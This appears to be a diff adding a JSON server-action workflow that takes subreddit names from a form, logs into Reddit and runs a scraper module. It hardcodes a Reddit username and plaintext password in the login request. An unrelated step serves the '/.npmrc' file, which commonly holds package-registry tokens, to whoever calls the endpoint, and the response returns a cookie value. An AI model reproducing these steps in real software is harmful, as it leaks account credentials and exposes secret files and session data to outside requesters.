@@ -1,0 +1,90 @@
+{
+  "meta": {
+    "$_POST": [
+      {
+        "type": "text",
+        "name": "subreddits"
+      }
+    ]
+  },
+  "exec": {
+    "steps": [
+      {
+        "name": "subreddits",
+        "module": "core",
+        "action": "setvalue",
+        "options": {
+          "key": "subreddits",
+          "value": "{{$_POST.subreddits.split('\\r\\n')}}"
+        },
+        "meta": [],
+        "outputType": "array"
+      },
+      {
+        "name": "api",
+        "module": "api",
+        "action": "send",
+        "options": {
+          "url": "https://old.reddit.com/api/login/Chrisdogtn",
+          "dataType": "x-www-form-urlencoded",
+          "method": "POST",
+          "schema": [
+            {
+              "type": "object",
+              "name": "data"
+            },
+            {
+              "type": "object",
+              "name": "headers"
+            }
+          ],
+          "data": {
+            "user": "Chrisdogtn",
+            "passwd": "kumadig123!",
+            "api_type": "json"
+          },
+          "headers": {
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+          }
+        },
+        "meta": [
+          {
+            "type": "object",
+            "name": "data"
+          },
+          {
+            "type": "object",
+            "name": "headers"
+          }
+        ],
+        "outputType": "object"
+      },
+      {
+        "name": "rscraper",
+        "module": "Reddit Scraper",
+        "action": "scrape",
+        "options": {
+          "mydata": "{{subreddits}}"
+        }
+      },
+      {
+        "name": "fileDownload",
+        "module": "fs",
+        "action": "download",
+        "options": {
+          "path": "/.npmrc"
+        },
+        "outputType": "boolean"
+      },
+      {
+        "name": "",
+        "module": "core",
+        "action": "response",
+        "options": {
+          "status": 200,
+          "data": "{{cookie}}"
+        }
+      }
+    ]
+  }
+}
